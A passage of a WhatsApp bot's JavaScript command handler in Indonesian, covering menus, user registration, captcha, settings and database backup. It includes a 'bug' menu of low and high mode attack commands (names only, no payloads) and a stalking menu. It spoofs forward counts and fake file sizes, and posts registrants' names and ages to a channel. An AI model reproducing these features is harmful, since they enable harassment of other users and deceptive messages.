${cmdRdm.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(randomMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'randomquotes': {
				let randomQuotes = `▢━━「 *QUOTES* 」━━▢

${cmdQuo.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(randomQuotes, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'cewekasiamenu': {
				let cewekMenu = `▢━━「 *CEWEK ASIA* 」━━▢

${cmdCwe.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(cewekMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'cowokasiamenu': {
				let cowokMenu = `▢━━「 *COWO GANTENG* 」━━▢

${cmdCwo.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(cowokMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'balancemenu': {
				let balanceMenu = `▢━━「 *BALANCE* 」━━▢

${cmdBal.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(balanceMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'ownermenu': {
				let ownerMenu = `▢━━「 *OWNER* 」━━▢

${cmdOwn.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(ownerMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'storagemenu': {
				let storageMenu = `▢━━「 *STORAGE* 」━━▢

${cmdStorage.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(storageMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'asupanmenu': {
				let asupanMenu = `▢━━「 *ASUPAN* 」━━▢

${cmdAsupan.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(asupanMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'randomsticker': {
				let randomSticker = `▢━━「 *STICKER* 」━━▢

${cmdStiker.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(randomSticker, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'stalkingmenu': {
				let stalkingMenu = `▢━━「 *STALKER* 」━━▢

${cmdStalk.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(stalkingMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'funmenu': {
				let funMenu = `▢━━「 *FUN (GABUT)* 」━━▢

${cmdFun.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(funMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'islammenu': {
				let islamMenu = `▢━━「 *ISLAMI* 」━━▢

${cmdIslam.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(islamMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'bugmenu': {
				let bugMenu = `
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝

*LOW MODE*
${cmdBug.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

*HARD MODE*
${cmdBugHard.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(bugMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'nsfwmenu': {
				let nsfwMenu = `▢━━「 *NSFW (18+)* 」━━▢

${cmdNsfw.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(nsfwMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'ephotomenu':
			case 'ephoto360menu': {
				let ephotoMenu = `▢━━「 *EPHOTO 360* 」━━▢

${cmdEph.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(ephotoMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'aimenu':
			case 'openaimenu': {
				let openai = `▢━━「 *SMART AI BOT* 」━━▢

${cmdAi.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(openai, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'donasi':
			case 'donate': {
				vreden.sendMessage(m.chat, {
					image: {
						url: setting.fotoDonasi
					},
					caption: `*乂 DONASI BOT*\n\nHai Kak, Ingin Donasi?, Silahkan Donasi Ke Owner Bot, Ketik .owner\n\n_Terima Kasih Yang Sudah Donasi, Berapapun Donasi Kamu Akan Sangat Saya Hargain_ >,<`
				}, {
					quoted: m
				})
			}
			break
			case 'rules':
			case 'aturan':
			case 'aturanbot': {
				var cpt = `Peraturan Penggunaan Bot :\n- Dilarang Spam\n- Dilarang Menelpon Bot\n- Dilarang Mengirim Virus Ke Bot\n\nCatatan :\nSemua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa Ada Campur Tangan Owner, Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
				await vreden.sendMessage(m.chat, {
					text: cpt,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'register':
			case 'registrasi':
			case 'regis':
			case 'daftar': {
				if (usersdb[m.sender].daftar) return m.warning(`Anda Telah Terverifikasi!!`)
				let nama = text.split(".")[0]
				let umur = text.split(".")[1]
				if (!nama || !umur) return m.warning(`*Masukan ${!nama ? "nama" : !umur ? "umur" : "data"} dengan benar!*\n\nCara:\n${prefix + command} nama.umur\n\nContoh:\n${prefix + command} Qioo.17\n\n*Metode Verify Lain:*\n${prefix}regmail\n${prefix}captcha`)
				if (isNaN(umur)) return m.warning(`*Masukan Umur Yang Valid!*\n\nCara:\n${prefix + command} nama.umur\n\nContoh:\n${prefix + command} Qioo.17\n\n*Metode Verify Lain:*\n${prefix}regmail\n${prefix}captcha`)
				if (umur < 10) return m.warning(`*Bocil Gak Diajak!*\n\nCara:\n${prefix + command} nama.umur\n\nContoh:\n${prefix + command} Qioo.17\n\n*Metode Verify Lain:*\n${prefix}regmail\n${prefix}captcha`)
				if (umur > 50) return m.warning(`*Udah Tua Mending Turu!*\n\nCara:\n${prefix + command} nama.umur\n\nContoh:\n${prefix + command} Qioo.17\n\n*Metode Verify Lain:*\n${prefix}regmail\n${prefix}captcha`)
				try {
					usersdb[m.sender].nama = nama
					usersdb[m.sender].umur = Number(umur)
					usersdb[m.sender].daftar = true
					usersdb[m.sender].saldo += 5000
					usersdb[m.sender].limit += 20
					if (verifyNumber[m.sender]) {
						clearTimeout(verifyNumber[m.sender][4])
						delete verifyNumber[m.sender]
					}
					m.sendForward(`------------ » *VERIFY AKUN* « ------------\n\n📦 *User Info*\n- Name : ${nama}\n- Nomor : ${usernomor}\n- Umur : ${umur}\n\n🎁 *Bonus Verifikasi*\n- + Rp 5000\n- + 20 Limit\n\n> ${footxt}`)
					if (notifRegister) {
						try {
							avatar = await vreden.profilePictureUrl(m.sender, "image")
						} catch {
							avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
						}
						vreden.sendMessage(idsaluran, {
							text: "```" + `Notification Register

Nama : ${nama}
Umur : ${umur}
Tag : @${m.sender.split("@")[0]}

Registered via auto` + "```",
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 9999999,
								isForwarded: true,
								externalAdReply: {
									showAdAttribution: true,
									containsAutoReply: true,
									title: `System Notification`,
									body: `${date} ${jam}`,
									previewType: "PHOTO",
									thumbnailUrl: avatar,
									sourceUrl: tiktok
								}
							}
						})
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'regemail':
			case 'regismail':
			case 'regmail': {
				if (usersdb[m.sender].daftar) return m.warning(`Anda Telah Terverifikasi!!`)
				if (!text) return m.warning(`Masukan Email Kamu\n\n*Contoh* :\n${prefix + command} QiooGen7@gmail.com`)
				if (!text.includes("@")) return m.warning(`Masukan Email Kamu\n\n*Contoh* :\n${prefix + command} QiooGen7@gmail.com`)
				try {
					avatar = await vreden.profilePictureUrl(m.sender, "image")
				} catch {
					avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
				}
				var angka = await randomNomor(1000, 9999)
				verifyNumber[m.sender] = [
					m.sender, angka, avatar, "email",
					setTimeout(() => {
						if (verifyNumber[m.sender]) {
							m.reply("*Waktu Verifikasi Habis!*")
							delete verifyNumber[m.sender]
						}
					}, 120000)
				]
				try {
					let data = await axios.get(`https://api.vreden.my.id/api/send-kode-email?kode=${angka}&nomorbot=${botNumber.split("@")[0]}&avatar=${encodeURIComponent(avatar)}&footer=${encodeURIComponent("© 2024 Vreden. All rights reserved.")}&subject=Kode%20Verifikasi%20Email&background=https://telegra.ph/file/686d6dadc3c08e906c2aa.jpg&email=${text}`)
					if (data.status == 200) {
						let perip = `*📌 Email Terkirim*

1. Buka Email Anda
2. Cari Email Dari Qioo
3. Cek Inbox Utama/Spam
4. Klik Tautan Konfirmasi

Kode Hanya Berlaku
Selama 2 Menit`
						let button = [{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\"}`
						}]
						let buffer = await getBuffer("https://pomf2.lain.la/f/ujn4y2tj.jpg")
						vreden.sendButtonDocument(m.chat, {
							document: fs.readFileSync('./media/thumbnail.jpg'),
							mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
							fileLength: 10000000000,
							pageCount: 77,
							jpegThumbnail: buffer,
							fileName: `Email Verification`,
						}, button, perip, footer, m)
					} else {
						m.reply("*Transporter Email Error :(*\n\n" + data.data.error)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'captcha':
			case 'regkode':
			case 'regcode': {
				if (usersdb[m.sender].daftar) return m.warning(`Anda Telah Terverifikasi!!`)
				try {
					avatar = await vreden.profilePictureUrl(m.sender, "image")
				} catch {
					avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
				}
				var angka = await randomNomor(1000, 9999)
				verifyNumber[m.sender] = [
					m.sender, angka, avatar, "captcha",
					setTimeout(() => {
						if (verifyNumber[m.sender]) {
							m.reply("*Waktu Verifikasi Habis!*")
							delete verifyNumber[m.sender]
						}
					}, 120000)
				]
				try {
					const {
						CaptchaGenerator
					} = require("captcha-canvas");
					const captcha = new CaptchaGenerator()
						.setDimension(150, 450)
						.setCaptcha({
							text: `${angka}`,
							size: 60,
							color: "blue"
						})
						.setDecoy({
							opacity: 0.5
						})
						.setTrace({
							color: "blue"
						});
					const buffer = captcha.generateSync();
					let button = [{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\"}`
					}]
					await vreden.sendButtonImage(m.chat, buffer, button, `*CAPTCHA CODE*\n\nMasukan Kode Verifikasi\nDiatas Untuk Memverifikasi\nBahwa Anda Bukan Robot\n\n\n_Chat Owner Jika Kode_\n_Tidak Muncul Atau Error_`, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'setprofile':
			case 'setprofil': {
				if (args[0] === "nama") {
					if (args[1].length > 11) return m.warning('Maksimal 11 Karakter!')
					const serialUser = `${args[1]}`
					usersdb[m.sender].nama = serialUser
					m.reply(`Sukses Ubah Nama Anda`)
				} else if (args[0] === "kota") {
					usersdb[m.sender].askot = args[1]
					m.reply("Kota Diubah ke " + args[1])
				} else if (args[0] === "umur") {
					if (isNaN(args[1])) return m.warning("*Yang bener umurnya dongg*")
					if (args[1] < 10) return m.warning("*Bocil Gak Diajak!*")
					if (args[1] > 60) return m.warning("*Udah Tua Turu Ajah Sana!*")
					usersdb[m.sender].umur = Number(args[1])
					m.reply("Umur Kamu Di Setting Ke " + args[1])
				} else {
					m.sendForward(`*Masukan Custom Profile!*

- nama
- kota
- umur

Contoh:
${prefix + command} nama wangsaf

`)
				}
			}
			break
			case 'infobot':
			case 'info':
			case 'botinfo': {
				var capt = `----------- » *BOT INFO* « -----------

- *name :* ${vreden.user.name}
- *number :* ${botNumber.split("@")[0]}
- *owner :* ${prefix}owner
- *user :* ${Object.values(usersdb).length} users
- *prefix :* ${prefix}
- *total :* ${totalFitur()} Fitur
- *error :* 4 Fitur


------------ » *FITUR BOT* « ------------

- *antidelete :* ${setting.antiDelete ? 'true' : ''}
- *anticall :* ${setting.anticall ? 'true' : ''}
- *antiviewonce :* ${setting.antiViewOnce ? 'true' : ''}
- *autobio :* ${setting.autobio ? 'true' : ''}
- *autoblock212 :* ${setting.autoblok212 ? 'true' : ''}
- *autorespond :* ${setting.autorespond ? 'true' : ''}
- *autoread :* ${setting.autoread ? 'true' : ''}
- *register only :* ${setting.onlyRegister ? 'true' : ''}
- *register notify:* ${setting.notifRegister ? 'true' : ''}
- *auto backup :* ${setting.autobackup ? 'true' : ''}
- *PC only :* ${setting.pconly ? 'true' : ''}
- *GC only :* ${setting.gruponly ? 'true' : ''}
`
				let button = [{
					"name": "single_select",
					"buttonParamsJson": `{
  "title": "Setting Bot",
  "sections": [
    {
      "title": "Register Only",
      "rows": [
        {
          "header": "On 🟢",
          "title": "onlyregister on",
          "description": "nyalakan onlyregister",
          "id": ".onlyregister on"
        },
        {
          "header": "Off 🔴",
          "title": "onlyregister off",
          "description": "matikan onlyregister",
          "id": ".onlyregister off"
        }
      ]
    },
    {
      "title": "Register Notify",
      "rows": [
        {
          "header": "On 🟢",
          "title": "notifregister on",
          "description": "nyalakan notifregister",
          "id": ".notifregister on"
        },
        {
          "header": "Off 🔴",
          "title": "notifregister off",
          "description": "matikan notifregister",
          "id": ".notifregister off"
        }
      ]
    },
    {
      "title": "Anti Hapus/Delete",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antidelete on",
          "description": "nyalakan antidelete",
          "id": ".antidelete on"
        },
        {
          "header": "Off 🔴",
          "title": "antidelete off",
          "description": "matikan antidelete",
          "id": ".antidelete off"
        }
      ]
    },
    {
      "title": "Anti Telpon",
      "rows": [
        {
          "header": "On 🟢",
          "title": "anticall on",
          "description": "nyalakan anticall",
          "id": ".anticall on"
        },
        {
          "header": "Off 🔴",
          "title": "anticall off",
          "description": "matikan anticall",
          "id": ".anticall off"
        }
      ]
    },
    {
      "title": "Anti Sekali Lihat",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antiviewonce on",
          "description": "nyalakan antiviewonce",
          "id": ".antiviewonce on"
        },
        {
          "header": "Off 🔴",
          "title": "antiviewonce off",
          "description": "matikan antiviewonce",
          "id": ".antiviewonce off"
        }
      ]
    },
    {
      "title": "Auto Bio",
      "rows": [
        {
          "header": "On 🟢",
          "title": "autobio on",
          "description": "nyalakan autobio",
          "id": ".autobio on"
        },
        {
          "header": "Off 🔴",
          "title": "autobio off",
          "description": "matikan autobio",
          "id": ".autobio off"
        }
      ]
    },
    {
      "title": "Auto Block +212",
      "rows": [
        {
          "header": "On 🟢",
          "title": "autoblok212 on",
          "description": "nyalakan autoblok212",
          "id": ".autoblok212 on"
        },
        {
          "header": "Off 🔴",
          "title": "autoblok212 off",
          "description": "matikan autoblok212",
          "id": ".autoblok212 off"
        }
      ]
    },
    {
      "title": "Auto Respond",
      "rows": [
        {
          "header": "On 🟢",
          "title": "autorespond on",
          "description": "nyalakan autorespond",
          "id": ".autorespond on"
        },
        {
          "header": "Off 🔴",
          "title": "autorespond off",
          "description": "matikan autorespond",
          "id": ".autorespond off"
        }
      ]
    },
    {
      "title": "Auto Read Chat/SW",
      "rows": [
        {
          "header": "On 🟢",
          "title": "autoread on",
          "description": "nyalakan autoread",
          "id": ".autoread on"
        },
        {
          "header": "Off 🔴",
          "title": "autoread off",
          "description": "matikan autoread",
          "id": ".autoread off"
        }
      ]
    },
    {
      "title": "Auto Backup Database",
      "rows": [
        {
          "header": "On 🟢",
          "title": "autobackup on",
          "description": "nyalakan autobackup",
          "id": ".autobackup on"
        },
        {
          "header": "Off 🔴",
          "title": "autobackup off",
          "description": "matikan autobackup",
          "id": ".autobackup off"
        }
      ]
    },
    {
      "title": "Chat Pribadi Only",
      "rows": [
        {
          "header": "On 🟢",
          "title": "pconly on",
          "description": "nyalakan pconly",
          "id": ".pconly on"
        },
        {
          "header": "Off 🔴",
          "title": "pconly off",
          "description": "matikan pconly",
          "id": ".pconly off"
        }
      ]
    },
    {
      "title": "Chat Grup Only",
      "rows": [
        {
          "header": "On 🟢",
          "title": "gconly on",
          "description": "nyalakan gconly",
          "id": ".gconly on"
        },
        {
          "header": "Off 🔴",
          "title": "gconly off",
          "description": "matikan gconly",
          "id": ".gconly off"
        }
      ]
    },
    {
      "title": "Set Pengaturan Config.json",
      "rows": [
        {
          "header": "Settings Change 🛠️",
          "title": "Settings",
          "description": "tampilkan opsi setting",
          "id": ".set"
        }
      ]
    }
  ]
}`
				}]
				try {
					vreden.sendButtonDocument(m.chat, {
						document: fs.readFileSync('./media/thumbnail.jpg'),
						mimetype: "image/png",
						fileLength: 10000000000,
						pageCount: 77,
						jpegThumbnail: fs.readFileSync("./media/thumbnail.jpg"),
						fileName: `${ucapanWaktu}`,
					}, button, capt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'database':
			case 'db':
			case 'dbdata': {
				if (!isCreator) return m.tolak('Khusus Owner Bot')
				try {
					let subCmd = args[0];
					switch (subCmd) {
						case 'total': {
							let userLength = Object.keys(usersdb).length;
							let chatsLength = Object.keys(chatsdb).length;
							let regisLength = Object.keys(usersdb).filter(key => usersdb[key].daftar).length;
							let RPGLength = Object.keys(usersdb).filter(key => usersdb[key].rpg).length;

							let persentregis = userLength > 0 ? ((regisLength / userLength) * 100).toFixed(2) + '%' : '0%';
							let persentrpg = userLength > 0 ? ((RPGLength / userLength) * 100).toFixed(2) + '%' : '0%';

							let teks = `## *DATABASE COUNT* ##

*User Count:* ${userLength}
*Chats Count:* ${chatsLength}
*Register Count:* ${regisLength}
*Joined RPG:* ${RPGLength}

*${persentregis}* Terdaftar
*${persentrpg}* RPG Join
`;

							m.reply(teks);
						}
						break;

						case 'up':
						case 'upload':
						case 'backup': {
							const FILE_PATH = './database/database.json';
							const fileName = `${botNumber.split`@`[0]}.json`
							let data = await uploadFileToGitHub(FILE_PATH, fileName);
							let teks = `# *DATABASE BACKUP* #

*Data ID* : ${data.content.name}
*Size Database* : ${bytesToSize(data.content.size)}
*Message* : ${data.commit.message}
*Download* : ${data.content.download_url}
*SHA* : ${data.content.sha}
`;
							m.reply(teks);
						}
						break;

						case 'reset': {
							m.reply("Database Reset!");
							await sleep(1000)
							let data = {};
							const outputPath = './database/database.json';
							fs.writeFileSync(outputPath, JSON.stringify(data, null, 2))
							process.exit(1);
						}
						break;

						case 'send': {
							let upbak = {
								key: {
									fromMe: false,
									participant: `0@s.whatsapp.net`,
									...(m.chat ? {
										remoteJid: "0@s.whatsapp.net"
									} : {}),
								},
								message: {
									conversation: `Succesfull backup database`,
								},
							};
							vreden.sendMessage(m.sender, {
								document: fs.readFileSync('./database/database.json'),
								fileName: 'database.json',
								mimetype: 'application/json'
							}, {
								quoted: upbak
							});
						}
						break;

						case 'recovery':
						case 'down':
						case 'recover': {
							const url = `https://raw.githubusercontent.com/cloudwhatsapp/database/main/${botNumber.split`@`[0]}.json`;
							const outputPath = './database/database.json';

							fetch(url)
								.then(response => {
									if (response.status === 404) {
										m.reply('File database tidak ditemukan di cloud.');
										return;
									}
									if (!response.ok) {
										throw new Error(`HTTP error! Status: ${response.status}`);
									}
									return response.json();
								})
								.then(data => {
									if (data) {
										fs.writeFileSync(outputPath, JSON.stringify(data, null, 2));
										db = data
										m.reply("Sukses memulihkan database dari cloud.");
									}
								})
								.catch(error => {
									console.error('Terjadi kesalahan:', error);
									m.reply("Terjadi kesalahan saat memulihkan database.");
								});
						}
						break;

						default: {
							let teks = `\`\`\`DATABASE OPTIONS\`\`\`

*total*
_hitung total database_

*reset*
_reset all database bot_

*send*
_get file database json_

*backup*
_backup database ke cloud_

*recovery*
_download database cloud_

*Contoh* :
${prefix + command} total
`;
							m.reply(teks);
						}
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break;
			case 'dashboard': {
				try {
					var posi = await getPosiCmdUser(m.sender, _cmdUser)
					_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
					_cmd.sort((a, b) => (a.count < b.count) ? 1 : -1)
					var posi = await getPosiCmdUser(m.sender, _cmdUser)
					var jumlahCmd = _cmd.length
					if (jumlahCmd > 10) jumlahCmd = 10
					var jumlah = _cmdUser[posi].db.length
					if (jumlah > 5) jumlah = 5
					var totalUser = 0
					for (let x of _cmdUser[posi].db) {
						totalUser = totalUser + x.count
					}
					var total = 0
					for (let o of _cmd) {
						total = total + o.count
					}
					var teks = `▢━━「 *DASHBOARD* 」━━▢\n\n*乂 PENGGUNAAN*\n- GLOBAL : ${total}\n- ANDA : ${totalUser}\n\n`
					teks += `*乂 COMMAND GLOBAL*\n\n`
					for (let u = 0; u < jumlahCmd; u++) {
